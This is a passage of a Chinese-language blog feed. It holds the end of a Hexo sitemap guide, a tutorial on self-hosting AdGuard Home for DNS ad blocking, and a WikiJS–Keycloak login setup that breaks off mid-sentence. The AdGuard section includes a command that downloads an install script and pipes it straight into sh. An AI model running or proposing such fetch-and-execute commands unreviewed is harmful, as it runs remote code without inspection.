的模版檔案位置<br>(如果不要生成 sitemap.txt 可以不寫)</td>\n</tr>\n<tr>\n<td>rel</td>\n<td>是否在 header 產生 rel-sitemap<br>詳情請看<a href=\"http://microformats.org/wiki/rel-sitemap\">說明</a></td>\n</tr>\n<tr>\n<td>tags</td>\n<td>是否產生個別 tag 頁面</td>\n</tr>\n<tr>\n<td>categories</td>\n<td>是否產生個別分類的頁面</td>\n</tr>\n</tbody></table>\n<h3 id=\"建立模版檔案\"><a href=\"#建立模版檔案\" class=\"headerlink\" title=\"建立模版檔案\"></a>建立模版檔案</h3><p>預設的 xml 與 txt 格式的模版可以在 github repo 內下載<br>xml: <a href=\"https://github.com/hexojs/hexo-generator-sitemap/blob/master/sitemap.xml\">https://github.com/hexojs/hexo-generator-sitemap/blob/master/sitemap.xml</a><br>txt: <a href=\"https://github.com/hexojs/hexo-generator-sitemap/blob/master/sitemap.txt\">https://github.com/hexojs/hexo-generator-sitemap/blob/master/sitemap.txt</a></p>\n<p>下載後放到 Hexo 的目錄即可</p>\n<blockquote>\n<p>模版檔案的路徑可以自訂<br>例如：模版檔案放在 your_hexo_site&#x2F;template&#x2F;sitemap.xml<br>設定檔 <code>_config.yml</code> 內的模版路徑 template 需要著修改</p>\n</blockquote>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">sitemap:</span><br>  <span class=\"hljs-string\">...</span><br>  <span class=\"hljs-attr\">template:</span> <span class=\"hljs-string\">./template/sitemap.xml</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"測試安裝\"><a href=\"#測試安裝\" class=\"headerlink\" title=\"測試安裝\"></a>測試安裝</h3><p>安裝完後啟動伺服器，到 <a href=\"http://localhost:4000/sitemap.xml\">http://localhost:4000/sitemap.xml</a> 看是否有產生 sitemap.xml</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">hexo server<br></code></pre></td></tr></table></figure>\n\n<p>產生靜態頁面也會自動產生 sitemap 檔案</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">hexo generate<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"跳過-sitemap-收錄\"><a href=\"#跳過-sitemap-收錄\" class=\"headerlink\" title=\"跳過 sitemap 收錄\"></a>跳過 sitemap 收錄</h2><p>如果有貼文或頁面想在 sitemap 中隱藏，可以在標頭 (Front-matter) 加 <code>sitemap: false</code></p>\n<p>例如：</p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"code\"><pre><code class=\"hljs markdown\">---<br>title: 隱藏貼文<br>date: 2020-01-01<br><span class=\"hljs-section\">sitemap: false</span><br><span class=\"hljs-section\">---</span><br><br></code></pre></td></tr></table></figure>",
            "tags": [
                "Hexo",
                "Blog"
            ]
        },
        {
            "id": "https://zonego.tw/2023/02/21/adguardhome/",
            "url": "https://zonego.tw/2023/02/21/adguardhome/",
            "title": "AdGuard Home 擋廣告工具",
            "date_published": "2023-02-21T11:42:28.000Z",
            "content_html": "<p>一般檔廣告大家都會使用瀏覽器插，例如 AD Bolck。這邊推薦可以從 DNS 下手</p>\n<span id=\"more\"></span>\n\n<h2 id=\"DNS-檔廣告原理\"><a href=\"#DNS-檔廣告原理\" class=\"headerlink\" title=\"DNS 檔廣告原理\"></a>DNS 檔廣告原理</h2><h3 id=\"DNS原理簡介\"><a href=\"#DNS原理簡介\" class=\"headerlink\" title=\"DNS原理簡介\"></a>DNS原理簡介</h3><p>一般瀏覽網站時，我們常會使用網域名稱 domain，代替只有數字的 IP 作為連線地址</p>\n<p><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/DNS.png\" alt=\"DNS\" data-caption=\"DNS\" loading=\"lazy\"><br>舉個例子🌰，要去 google 首頁 <a href=\"https://www.google.com/\">https://www.google.com</a> ，其中 <a href=\"http://www.google.com/\">www.google.com</a> 就是網域名稱<br>瀏覽器會先去 DNS 伺服器用網域名稱查出 Google 的伺服器 IP<br>知道 IP 後才能連到 Google 的伺服器請求資料</p>\n<p>在這中間，Google 也會順便將要顯示的廣告網址一起送回來<br>瀏覽器再照之前的流程，去廣告商的伺服器去抓廣告回來顯示</p>\n<p>想知道更多 DNS 詳細機制，可以參考 <a href=\"https://www.cloudflare.com/zh-tw/learning/dns/what-is-dns/\">Coudflare 寫的說明</a></p>\n<h3 id=\"DNS沉洞（DNS-sinkhole）\"><a href=\"#DNS沉洞（DNS-sinkhole）\" class=\"headerlink\" title=\"DNS沉洞（DNS sinkhole）\"></a>DNS沉洞（DNS sinkhole）</h3><p>看完原理後，反過來說，只要 DNS 伺服器不能正常把網域名稱換成 IP，網路就像斷了，只剩直接給 IP 的方式還能連線</p>\n<p>所以只要在 DNS 伺服器動手腳把廣告的網址設定成錯誤的IP(例如：127.0.0.1)，廣告就無法正常顯示</p>\n<p>這種作法就叫做 <code>DNS沉洞</code>（DNS sinkhole）</p>\n<p>有幾套可以自己架的 DNS 伺服器軟體可以達到這種效果，如 PI-Hole、 AdGuard Home<br>這邊主要介紹 AdGuard Home</p>\n<p><del>PI-Hole 改天在寫</del></p>\n<h2 id=\"AdGuard-Home\"><a href=\"#AdGuard-Home\" class=\"headerlink\" title=\"AdGuard Home\"></a>AdGuard Home</h2><p><a href=\"https://adguard.com/zh_tw/adguard-home/overview.html\">AdGuard Home 官方網站</a></p>\n<p><a href=\"https://github.com/AdguardTeam/AdGuardHome\">AdGuard Home GitHub repo</a></p>\n<p><img src=\"https://camo.githubusercontent.com/c6223645832b66d312f31eecbf833e23f95e363198d83de29438db55d01c8eca/68747470733a2f2f63646e2e6164746964792e6f72672f7075626c69632f416467756172642f436f6d6d6f6e2f616467756172645f686f6d652e676966\"></p>\n<p>附上 AdGuard Home 提供的功能比對表…</p>\n<table>\n<thead>\n<tr>\n<th>功能</th>\n<th>AdGuard Home</th>\n<th>Pi-Hole</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>阻擋廣告與追蹤器</td>\n<td>✅</td>\n<td>✅</td>\n</tr>\n<tr>\n<td>自訂阻擋清單</td>\n<td>✅</td>\n<td>✅</td>\n</tr>\n<tr>\n<td>內建 DHCP server 功能</td>\n<td>✅</td>\n<td>✅</td>\n</tr>\n<tr>\n<td>HTTPS 管理介面</td>\n<td>✅</td>\n<td>❌ 需手動設定 lighttpd</td>\n</tr>\n<tr>\n<td>上游 DNS 伺服器加密<br>(DNS-over-HTTPS, DNS-over-TLS, DNSCrypt)</td>\n<td>✅</td>\n<td>❌ (需安裝額外插件)</td>\n</tr>\n<tr>\n<td>跨平台支援</td>\n<td>✅</td>\n<td>❌ (需透過 Docker)</td>\n</tr>\n<tr>\n<td>支援加密<br>DNS-over-HTTPS or DNS-over-TLS server</td>\n<td>✅</td>\n<td>❌ (需安裝額外插件)</td>\n</tr>\n<tr>\n<td>阻擋惡意網域</td>\n<td>✅</td>\n<td>❌ (需要使用另外的阻擋清單)</td>\n</tr>\n<tr>\n<td>家長管控 (阻擋成人網站)</td>\n<td>✅</td>\n<td>❌ (需自行設定阻擋清單)</td>\n</tr>\n<tr>\n<td>強制搜尋引擎啟用安全搜尋</td>\n<td>✅</td>\n<td>❌</td>\n</tr>\n<tr>\n<td>Per-client (device) configuration</td>\n<td>✅</td>\n<td>✅</td>\n</tr>\n<tr>\n<td>存取設定 (設定可用 AGH DNS 的名單)</td>\n<td>✅</td>\n<td>❌</td>\n</tr>\n<tr>\n<td>[不需 root 權限][wiki-noroot]執行</td>\n<td>✅</td>\n<td>❌</td>\n</tr>\n</tbody></table>\n<p>基本上我們只用擋廣告的功能，AdGuardHome 跟 Pi-Hole 選順手好用的就好<br>雖說 AdGuard Home 有原生跨平台支援，不過真的要用也是用 Docker 去不同平台執行比較方便</p>\n<h2 id=\"安裝-AdGuard-Home\"><a href=\"#安裝-AdGuard-Home\" class=\"headerlink\" title=\"安裝 AdGuard Home\"></a>安裝 AdGuard Home</h2><h3 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h3><p>官方有提供 Linux 系統的自動安裝腳本</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-comment\"># 可以用 wget, curl 等工具下載腳本</span><br>wget --no-verbose -O - https:<span class=\"hljs-regexp\">//</span>raw.githubusercontent.com<span class=\"hljs-regexp\">/AdguardTeam/</span>AdGuardHome<span class=\"hljs-regexp\">/master/</span>scripts/install.sh | sh -s -- -v<br></code></pre></td></tr></table></figure>\n<p>腳本參數：</p>\n<ul>\n<li><code>-c &lt;channel&gt;</code> 使用特定的安裝渠道，預設是從 release 安裝，可用 <code>development</code> <code>edge</code> <code>beta</code> <code>release</code></li>\n<li><code>-r</code> 重新安裝 AdGuard Home (不可與 <code>-u</code> 一起用)</li>\n<li><code>-u</code> 移除 AdGuard Home (不可與 <code>-r</code> 一起用)</li>\n<li><code>-v</code> 查看更多安裝時訊息</li>\n</ul>\n<p>或是手動下載、安裝<br>到 <a href=\"https://github.com/AdguardTeam/AdGuardHome/releases\">GitHub Release</a> 下載對應 OS 的安裝檔<br>例如安裝 Linux x64 版本</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">tar zxvf AdGuardHome_linux_amd64.tar.gz<br><br>./AdGuardHome -s install<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>建議使用剛裝好系統的 VM 來裝 AdGuard Home，方便備份或是避免 port 衝突</p>\n</blockquote>\n<h3 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h3><p>跟 Linux 手動安裝步驟相同，到 <a href=\"https://github.com/AdguardTeam/AdGuardHome/releases\">GitHub Release</a> 下載 windows 版本後執行</p>\n<h3 id=\"Docker\"><a href=\"#Docker\" class=\"headerlink\" title=\"Docker\"></a>Docker</h3><p><a href=\"https://hub.docker.com/r/adguard/adguardhome\">AdGuard Home Docker Hub</a></p>\n<p>docker 指令：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"code\"><pre><code class=\"hljs awk\">docker run --name adguardhome\\<br>    --restart unless-stopped\\<br>    -v <span class=\"hljs-regexp\">/my/</span>own<span class=\"hljs-regexp\">/workdir:/</span>opt<span class=\"hljs-regexp\">/adguardhome/</span>work\\<br>    -v <span class=\"hljs-regexp\">/my/</span>own<span class=\"hljs-regexp\">/confdir:/</span>opt<span class=\"hljs-regexp\">/adguardhome/</span>conf\\<br>    -p <span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">53</span><span class=\"hljs-regexp\">/tcp -p 53:53/u</span>dp\\<br>    -p <span class=\"hljs-number\">67</span>:<span class=\"hljs-number\">67</span><span class=\"hljs-regexp\">/udp -p 68:68/u</span>dp\\<br>    -p <span class=\"hljs-number\">80</span>:<span class=\"hljs-number\">80</span><span class=\"hljs-regexp\">/tcp -p 443:443/</span>tcp -p <span class=\"hljs-number\">443</span>:<span class=\"hljs-number\">443</span><span class=\"hljs-regexp\">/udp -p 3000:3000/</span>tcp\\<br>    -p <span class=\"hljs-number\">853</span>:<span class=\"hljs-number\">853</span>/tcp\\<br>    -p <span class=\"hljs-number\">784</span>:<span class=\"hljs-number\">784</span><span class=\"hljs-regexp\">/udp -p 853:853/u</span>dp -p <span class=\"hljs-number\">8853</span>:<span class=\"hljs-number\">8853</span>/udp\\<br>    -p <span class=\"hljs-number\">5443</span>:<span class=\"hljs-number\">5443</span><span class=\"hljs-regexp\">/tcp -p 5443:5443/u</span>dp\\<br>    -d adguard/adguardhome<br></code></pre></td></tr></table></figure>\n\n<p>其中的 Port 設定</p>\n<ul>\n<li><code>-p 53:53/tcp -p 53:53/udp</code>: 預設 DNS 使用 port</li>\n<li><code>-p 67:67/udp -p 68:68/tcp -p 68:68/udp</code>: DHCP 使用 port (如不使用 DHCP 可以跳過)</li>\n<li><code>-p 3000:3000/tcp -p 443:443/tcp</code>: AdGuard Home 的管理介面 (如不需設定 HTTPS 可以不用 443 port)</li>\n<li><code>-p 80:80/tcp -p 443:443/tcp -p 443:443/udp</code>: DNS-over-HTTPS 使用 port</li>\n<li><code>-p 853:853/tcp</code>: DNS-over-TLS 使用 port</li>\n<li><code>-p 784:784/udp -p 853:853/udp -p 8853:8853/udp</code>: DNS-over-QUIC 使用 port (只需要設定其中一個或兩個，不需要全都用)</li>\n<li><code>-p 5443:5443/tcp -p 5443:5443/udp</code>: DNSCrypt 使用 port.</li>\n</ul>\n<p>如果要使用 DHCP server 的功能，建議將讓容器使用主機網路 (需注意 port 衝突)</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"code\"><pre><code class=\"hljs awk\">docker run --name adguardhome\\<br>    --restart unless-stopped\\<br>    -v <span class=\"hljs-regexp\">/my/</span>own<span class=\"hljs-regexp\">/workdir:/</span>opt<span class=\"hljs-regexp\">/adguardhome/</span>work\\<br>    ...<br>    --network host<br>    -d adguard/adguardhome<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"設定\"><a href=\"#設定\" class=\"headerlink\" title=\"設定\"></a>設定</h2><blockquote>\n<p>這邊我是在自己的電腦上用 docker 展示，連線會用 localhost 去連<br>實際使用建議獨立裝在其他不常關的電腦或樹梅派，連線就使用 IP 連</p>\n</blockquote>\n<h3 id=\"初次設定\"><a href=\"#初次設定\" class=\"headerlink\" title=\"初次設定\"></a>初次設定</h3><p><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_init1.png\" alt=\"adguard init\" data-caption=\"adguard init\" loading=\"lazy\"></p>\n<h4 id=\"網路設定\"><a href=\"#網路設定\" class=\"headerlink\" title=\"網路設定\"></a>網路設定</h4><p>接下來設定監聽的網卡(透過哪張網卡能存取)，用 Docker 執行建議可以用所有介面<br>管理員的監聽介面如果在 docker 沒有使用 80，記得設定成 3000，避免設定完就連不到<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_init2.png\" alt=\"adguard init\" data-caption=\"adguard init\" loading=\"lazy\"><br>DNS 伺服器監聽介面同上，建議保留預設的 53 Port<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_init3.png\" alt=\"adguard init\" data-caption=\"adguard init\" loading=\"lazy\"></p>\n<h5 id=\"管理帳號設定\"><a href=\"#管理帳號設定\" class=\"headerlink\" title=\"管理帳號設定\"></a>管理帳號設定</h5><p>設定管理員帳號密碼，建議不要用 <code>root</code>, <code>admin</code>, <code>administor</code> 等常見的管理帳號<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_init4.png\" alt=\"adguard init\" data-caption=\"adguard init\" loading=\"lazy\"></p>\n<h4 id=\"用戶端設定\"><a href=\"#用戶端設定\" class=\"headerlink\" title=\"用戶端設定\"></a>用戶端設定</h4><p>初次設定完成，這邊可以看一下不同種類客戶端該怎麼設定使用這個 DNS 伺服器<br>基本上只要將網路設定裡的 DNS 伺服器，改成這邊監聽的網卡的IP，就可以用 Adguard 過濾網站<br>路由器也要套用的話，是去修改路由器的 DHCP 設定，讓子網段自動分配的 DNS 都使用我們架的 Adguard IP<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_init5.png\" alt=\"adguard init\" data-caption=\"adguard init\" loading=\"lazy\"><br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_init6.png\" alt=\"adguard init\" data-caption=\"adguard init\" loading=\"lazy\"></p>\n<h5 id=\"初次設定完成🎉\"><a href=\"#初次設定完成🎉\" class=\"headerlink\" title=\"初次設定完成🎉\"></a>初次設定完成🎉</h5><p><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_init7.png\" alt=\"adguard init\" data-caption=\"adguard init\" loading=\"lazy\"></p>\n<p>接著可以用設定好的管理員帳號登入<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_login.png\" alt=\"adguard login\" data-caption=\"adguard login\" loading=\"lazy\"></p>\n<h3 id=\"設定上游-DNS-伺服器\"><a href=\"#設定上游-DNS-伺服器\" class=\"headerlink\" title=\"設定上游 DNS 伺服器\"></a>設定上游 DNS 伺服器</h3><p>在 Adguard Home 中並不會紀錄設定之外的網域及IP的對應<br>其他網域就需要去其他的 DNS 伺服器(上游 DNS 伺服器)查詢<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_upstreamDNS.png\" alt=\"adguard upstream DNS\" data-caption=\"adguard upstream DNS\" loading=\"lazy\"></p>\n<p>Adguard Home 整理了幾個常用的 DNS 伺服器 <a href=\"https://adguard-dns.io/kb/zh-CN/general/dns-providers/\">https://adguard-dns.io/kb/zh-CN/general/dns-providers/</a><br>這邊推薦可以用 Google DNS 跟 Cloudflare DNS</p>\n<h4 id=\"Google-DNS\"><a href=\"#Google-DNS\" class=\"headerlink\" title=\"Google DNS\"></a>Google DNS</h4><table>\n<thead>\n<tr>\n<th>協定</th>\n<th>地址</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>DNS, IPv4</td>\n<td>8.8.8.8 和 8.8.4.4</td>\n</tr>\n<tr>\n<td>DNS, IPv6</td>\n<td>2001:4860:4860::8888 和 2001:4860:4860::8844</td>\n</tr>\n<tr>\n<td>DNS-over-HTTPS</td>\n<td><a href=\"https://dns.google/dns-query\">https://dns.google/dns-query</a></td>\n</tr>\n<tr>\n<td>DNS-over-TLS</td>\n<td>tls:&#x2F;&#x2F;dns.google</td>\n</tr>\n</tbody></table>\n<h4 id=\"Cloudflare-DNS\"><a href=\"#Cloudflare-DNS\" class=\"headerlink\" title=\"Cloudflare DNS\"></a>Cloudflare DNS</h4><table>\n<thead>\n<tr>\n<th>協定</th>\n<th>地址</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>DNS, IPv4</td>\n<td>1.1.1.1 和 1.0.0.1</td>\n</tr>\n<tr>\n<td>DNS, IPv6</td>\n<td>2606:4700:4700::1111 和 2606:4700:4700::1001</td>\n</tr>\n<tr>\n<td>DNS-over-HTTPS IPv4</td>\n<td><a href=\"https://dns.cloudflare.com/dns-query\">https://dns.cloudflare.com/dns-query</a></td>\n</tr>\n<tr>\n<td>DNS-over-HTTPS IPv6</td>\n<td><a href=\"https://dns.cloudflare.com/dns-query\">https://dns.cloudflare.com/dns-query</a></td>\n</tr>\n<tr>\n<td>DNS-over-TLS</td>\n<td>tls:&#x2F;&#x2F;1dot1dot1dot1.cloudflare-dns.com</td>\n</tr>\n</tbody></table>\n<h2 id=\"過濾器設定\"><a href=\"#過濾器設定\" class=\"headerlink\" title=\"過濾器設定\"></a>過濾器設定</h2><h3 id=\"過濾黑名單\"><a href=\"#過濾黑名單\" class=\"headerlink\" title=\"過濾黑名單\"></a>過濾黑名單</h3><p><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_blocklist.png\" alt=\"adguard blocklist\" data-caption=\"adguard blocklist\" loading=\"lazy\"></p>\n<h4 id=\"預設黑名單\"><a href=\"#預設黑名單\" class=\"headerlink\" title=\"預設黑名單\"></a>預設黑名單</h4><p>Adguard Home 預設使用 Adguard 的過濾黑名單<br>新增黑名單也很方便<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_blocklist_new.png\" alt=\"adguard blocklist new\" data-caption=\"adguard blocklist new\" loading=\"lazy\"><br>把想套用的黑名單加進去啟用<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_blocklist_new2.png\" alt=\"adguard blocklist new\" data-caption=\"adguard blocklist new\" loading=\"lazy\"></p>\n<h4 id=\"第三方黑名單\"><a href=\"#第三方黑名單\" class=\"headerlink\" title=\"第三方黑名單\"></a>第三方黑名單</h4><p>要使用第三方黑名單只要有網址也可以匯入<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_blocklist_new3.png\" alt=\"adguard blocklist new\" data-caption=\"adguard blocklist new\" loading=\"lazy\"><br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_blocklist_new4.png\" alt=\"adguard blocklist new\" data-caption=\"adguard blocklist new\" loading=\"lazy\"></p>\n<p>這邊介紹一款專為臺灣人設計的廣告阻擋規則 <a href=\"https://github.com/FutaGuard/LowTechFilter\">LowTechFilter</a><br>提供阻擋台灣常見的簡訊詐騙、釣魚網站和農場文</p>\n<ul>\n<li>簡訊詐騙、釣魚網站 <a href=\"https://filter.futa.gg/hosts.txt\">https://filter.futa.gg/hosts.txt</a>  </li>\n<li>農場文 <a href=\"https://filter.futa.gg/nofarm_hosts.txt\">https://filter.futa.gg/nofarm_hosts.txt</a></li>\n</ul>\n<h3 id=\"手動過濾規則\"><a href=\"#手動過濾規則\" class=\"headerlink\" title=\"手動過濾規則\"></a>手動過濾規則</h3><p>可以從主頁到 DNS 查詢紀錄裡去增加封鎖名單，不過缺點是之前要先查詢過</p>\n<blockquote>\n<p>還沒有用戶端用這個 DNS 伺服器之前，紀錄會是空的<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_dashboard.png\" alt=\"adguard dashboard\" data-caption=\"adguard dashboard\" loading=\"lazy\"><br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_record.png\" alt=\"adguard record\" data-caption=\"adguard record\" loading=\"lazy\"></p>\n</blockquote>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><h3 id=\"家長管控\"><a href=\"#家長管控\" class=\"headerlink\" title=\"家長管控\"></a>家長管控</h3><p><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/adguard_ad.png\" alt=\"adguard blocklist new\" data-caption=\"adguard blocklist new\" loading=\"lazy\"></p>\n",
            "tags": [
                "Self-Hosting",
                "Windows",
                "Linux",
                "DNS"
            ]
        },
        {
            "id": "https://zonego.tw/2023/02/10/wikijs-keyckoak/",
            "url": "https://zonego.tw/2023/02/10/wikijs-keyckoak/",
            "title": "設定 WikiJS 使用 Keyckoak 做身分認證",
            "date_published": "2023-02-10T06:35:35.000Z",
            "content_html": "<p>最近在設定 WikiJS 串接 Keycloak 作身分認證時碰到一些問題，所以在這邊做個紀錄<br>這邊就跳過安裝過程</p>\n<span id=\"more\"></span>\n\n<p>紀錄時使用版本： <code>WikiJS 2.5.296</code>  <code>Keycloak 20.0.3</code></p>\n<h2 id=\"Keycloak-設定\"><a href=\"#Keycloak-設定\" class=\"headerlink\" title=\"Keycloak 設定\"></a>Keycloak 設定</h2><p>挑選你要設定登入的 realm ，這邊我為了不要應用程式的帳號跟 Keycloak 的管理帳號混用，建一個新的 realm 叫做 demo</p>\n<blockquote>\n<p>realm 像是用來管理帳號的群組，在這個群組內建好的應用方式都可以透過這些帳號登入</p>\n</blockquote>\n<h3 id=\"新增-client\"><a href=\"#新增-client\" class=\"headerlink\" title=\"新增 client\"></a>新增 client</h3><p><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/keycloak-wikijs-new_client.png\" alt=\"creat\" data-caption=\"creat\" loading=\"lazy\"></p>\n<p>打上 client ID (不可重複) ，next 下一步<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/keycloak-wikijs-new_client2.png\" alt=\"creat\" data-caption=\"creat\" loading=\"lazy\"></p>\n<p>這邊 Client authentication 必須要勾選，才會產生後面要用到的 Client Secret。點 Save 儲存<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/keycloak-wikijs-new_client3.png\" alt=\"creat\" data-caption=\"creat\" loading=\"lazy\"></p>\n<h3 id=\"設定-client\"><a href=\"#設定-client\" class=\"headerlink\" title=\"設定 client\"></a>設定 client</h3><p>打開剛剛建好的 client <code>wiki</code><br>下滑到 Access Setting<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/keycloak-wikijs-access-setting.png\" alt=\"setting\" data-caption=\"setting\" loading=\"lazy\"></p>\n<p>假設我們的 wikijs 網址是 <a href=\"https://wiki.example.com/\">https://wiki.example.com</a></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>填入URL</th>\n<th>說明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Root URL</td>\n<td><a href=\"https://wiki.example.com/\">https://wiki.example.com</a></td>\n<td>網站根網址</td>\n</tr>\n<tr>\n<td>Home URL</td>\n<td><a href=\"https://wiki.example.com/\">https://wiki.example.com</a></td>\n<td>登入後重導向的根網址 (通常跟 root url 相同)</td>\n</tr>\n<tr>\n<td>Valid rediect URIs</td>\n<td>&#x2F;XXXXXXXX&#x2F;callback<br>&#x2F;*</td>\n<td>允許重導向頁面網址<br>用 * 可以代表所有頁面，但要注意安全性</td>\n</tr>\n<tr>\n<td>Valid post logout</td>\n<td><a href=\"https://wiki.example.com/\">https://wiki.example.com</a></td>\n<td>允許登出後轉向的頁面</td>\n</tr>\n<tr>\n<td>redirect URIs</td>\n<td>&#x2F;*</td>\n<td>允許登出後的重導向位置</td>\n</tr>\n<tr>\n<td>Web origins</td>\n<td></td>\n<td>允許 CORS origins 的網址</td>\n</tr>\n</tbody></table>\n<p><code>Valid rediect URIs</code> 可以在後面設定 wikijs 時取得</p>\n<p>如果你的 Keycloak 有安裝客製主題，可以在 Login settings 裡修改<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/keycloak-wikijs-login-theme.png\" alt=\"setting\" data-caption=\"setting\" loading=\"lazy\"></p>\n<p>Credentials 分頁有後續會用到的 client key，可以先複製<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/keycloak-wikijs-client_key.png\" alt=\"setting\" data-caption=\"setting\" loading=\"lazy\"></p>\n<h2 id=\"Wikijs-設定\"><a href=\"#Wikijs-設定\" class=\"headerlink\" title=\"Wikijs 設定\"></a>Wikijs 設定</h2><p>進到設定後選認證 &gt; 新增登入機制<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/keycloak-wikijs-provider.png\" alt=\"wikijs\" data-caption=\"wikijs\" loading=\"lazy\"></p>\n<p>選擇 Keycloak<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/keycloak-wikijs-provider2.png\" alt=\"wikijs\" data-caption=\"wikijs\" loading=\"lazy\"></p>\n<p>再來填入你的 Keycloak 網址、realm 名稱跟剛剛建好的 Client ID<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/keycloak-wikijs-provider3.png\" alt=\"wikijs\" data-caption=\"wikijs\" loading=\"lazy\"></p>\n<p>下面4個網址可以參考 wikijs 的提示，不過左邊的 <code>/auth</code> 要去掉，例如：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"code\"><pre><code class=\"hljs awk\">wikij 提示<br>https:<span class=\"hljs-regexp\">//</span>KEYCLOAK-HOST<span class=\"hljs-regexp\">/auth/</span>realms<span class=\"hljs-regexp\">/YOUR-REALM/</span>protocol<span class=\"hljs-regexp\">/openid-connect/</span>auth<br><br>左邊的 /auth 去掉，範例的 realms 是 demo<br>https:<span class=\"hljs-regexp\">//y</span>our.keycloak-host.com<span class=\"hljs-regexp\">/realms/</span>demo<span class=\"hljs-regexp\">/protocol/</span>openid-connect/auth<br></code></pre></td></tr></table></figure>\n\n<p>Client Secret 貼上 Keycloak Credentials 內複製的金鑰<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/keycloak-wikijs-provider4.png\" alt=\"wikijs\" data-caption=\"wikijs\" loading=\"lazy\"></p>\n<p>開放自由註冊可以斟酌打開，若沒開沒登入過的帳號會無法登入<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/keycloak-wikijs-provider5.png\" alt=\"wikijs\" data-caption=\"wikijs\" loading=\"lazy\"></p>\n<p>最下面可以取得 keycloak 設定需要的 Valid rediect URI<br>只需要填 &#x2F;login&#x2F;a28088b1-8e47-4d16-aa6f-0a32d8af192f&#x2F;callback<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/keycloak-wikijs-provider6.png\" alt=\"wikijs\" data-caption=\"wikijs\" loading=\"lazy\"></p>\n<p>設定完記得卷到上面點套用設定<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/keycloak-wikijs-provider3.png\" alt=\"wikijs\" data-caption=\"wikijs\" loading=\"lazy\"></p>\n<hr>\n<h2 id=\"問題排除\"><a href=\"#問題排除\" class=\"headerlink\" title=\"問題排除\"></a>問題排除</h2><h3 id=\"登出時遇到-invalid-parameter-redirect-uri\"><a href=\"#登出時遇到-invalid-parameter-redirect-uri\" class=\"headerlink\" title=\"登出時遇到 invalid parameter redirect_uri\"></a>登出時遇到 invalid parameter redirect_uri</h3><p><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/invalid-parameter-redirect_uri.png\" alt=\"invalid parameter redirect_uri\" data-caption=\"invalid parameter redirect_uri\" loading=\"lazy\"></p>\n<p>keycloak 在 18 版之後就不支援登出時使用<code>redirect_uri</code>參數，所以只能先暫時先把 WikiJS 的同步登出先關閉，等 WikiJS 更新<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/keycloak-wikijs-provider5.png\" alt=\"WikiJS sync logout\" data-caption=\"WikiJS sync logout\" loading=\"lazy\"></p>\n<blockquote>\n<p>關閉後的缺點是在同一台裝置，session 未過期前，點一下 keycloak 